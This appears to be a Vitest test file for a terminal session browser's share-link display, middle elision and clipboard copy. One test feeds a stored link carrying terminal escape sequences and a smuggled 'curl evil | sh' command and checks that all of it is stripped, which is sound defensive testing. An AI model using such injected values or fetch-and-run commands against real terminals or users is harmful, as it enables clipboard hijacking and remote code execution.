import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { elide, w } from "../src/browse/kit.js";
import { latestShare, type ShareRecord, type SharesFile } from "../src/sessions/shares.js";
import { drive, KEY, NOW } from "./browse-helpers.js";

beforeEach(() => vi.useFakeTimers());
afterEach(() => vi.useRealTimers());

const GIST = "https://overshare.link/s/#octocat/5260b8cf9b1baae31a40717ac1ab5f08";
const record = (url: unknown, over: Partial<ShareRecord> = {}): ShareRecord =>
  ({ url, mode: "full", target: "gist", sharedAt: new Date(NOW - 2 * 3_600_000).toISOString(), ...over }) as ShareRecord;
const shared = (...records: ShareRecord[]): SharesFile => ({ "claude-code:s1": records });

describe("the share link in the list preview", () => {
  it("shows the newest link under the shared line, and how many shares came before it", () => {
    const d = drive({ shares: shared(record("https://overshare.link/s/#r2:older", { mode: "brief" }), record(GIST)) });
    const text = d.text(170); // a preview wide enough for the whole link
    expect(text).toContain("✓ shared 2h ago (full) · +1 earlier");
    expect(text).toContain(GIST);
    expect(text).not.toContain("r2:older");
  });

  it("shows nothing for a session that was never shared", async () => {
    const d = drive({ shares: shared(record(GIST)) });
    await d.press(KEY.down);
    expect(d.text()).not.toContain("overshare.link");
    expect(d.text()).not.toContain("✓ shared");
  });

  it("cuts a long link in the middle so the host and the id's tail stay readable", () => {
    const d = drive({ shares: shared(record(GIST)) });
    const text = d.text(100);
    expect(text).toMatch(/https:\/\/overshare\S*…\S*ab5f08/);
    expect(text).not.toContain(GIST);
  });
});

describe("y on a shared session", () => {
  it("copies exactly the link on screen and prints it whole in the footer", async () => {
    const copied: string[] = [];
    const d = drive({ shares: shared(record(GIST)), copy: (t) => void copied.push(t) });
    await d.press("y");
    expect(copied).toEqual([GIST]);
    expect(d.lines(140).at(-1)).toContain(`link sent to clipboard (OSC 52): ${GIST}`);
  });

  it("says so when there is nothing to copy", async () => {
    const copied: string[] = [];
    const d = drive({ copy: (t) => void copied.push(t) });
    await d.press("y");
    expect(copied).toEqual([]);
    expect(d.text()).toContain("not shared yet (p to publish)");
  });

  it("goes through the same copy hook after publishing", async () => {
    const copied: string[] = [];
    const d = drive({ copy: (t) => void copied.push(t) });
    await d.press("p", KEY.enter, "y", "y");
    expect(copied).toEqual(["https://viewer.example/#s1"]);
    expect(d.text()).toContain("link sent to clipboard (OSC 52)");
  });
});

describe("a stored link is untrusted text", () => {
  const hostile = "https://ok.example/#a\x1b]52;c;ZXZpbA==\x07b\x1b[2J\ncurl evil | sh";

  it("is drawn and copied without terminal sequences, control characters or whitespace", async () => {
    const copied: string[] = [];
    const d = drive({ shares: shared(record(hostile)), copy: (t) => void copied.push(t) });
    await d.press("y");
    expect(copied).toEqual(["https://ok.example/#abcurlevil|sh"]);
    const raw = d.app.render(140).join("\n");
    expect(raw).not.toContain("]52;");
    expect(raw).not.toContain("[2J");
  });

  it("skips records without a usable link", () => {
    const all = shared(record(GIST), record(42), record("\x1b[2J \n"));
    expect(latestShare(all, "claude-code", "s1")).toMatchObject({ link: GIST, earlier: 0 });
    expect(latestShare(shared(record(undefined)), "claude-code", "s1")).toBeUndefined();
    expect(latestShare({ "claude-code:s1": "not a list" } as unknown as SharesFile, "claude-code", "s1")).toBeUndefined();
  });
});

describe("the share link in the session viewer", () => {
  it("is in the header, whole when it fits", async () => {
    const d = drive({ shares: shared(record(GIST)) });
    await d.press(KEY.enter);
    expect(d.lines(140).slice(0, 4).join("\n")).toContain(`✓ shared (full)  ${GIST}`);
  });

  it("adds no header line to a session that was never shared", async () => {
    const d = drive();
    await d.press(KEY.enter);
    expect(d.text()).not.toContain("✓ shared");
  });
});

describe("elide", () => {
  it("keeps text that fits and cuts the middle of text that does not, to exactly the width", () => {
    expect(elide("short", 10)).toBe("short");
    const out = elide(GIST, 30);
    expect(w(out)).toBe(30);
    expect(out.startsWith("https://overs")).toBe(true);
    expect(out.endsWith("ab5f08")).toBe(true);
    expect(w(elide(GIST, 2))).toBe(2);
  });
});
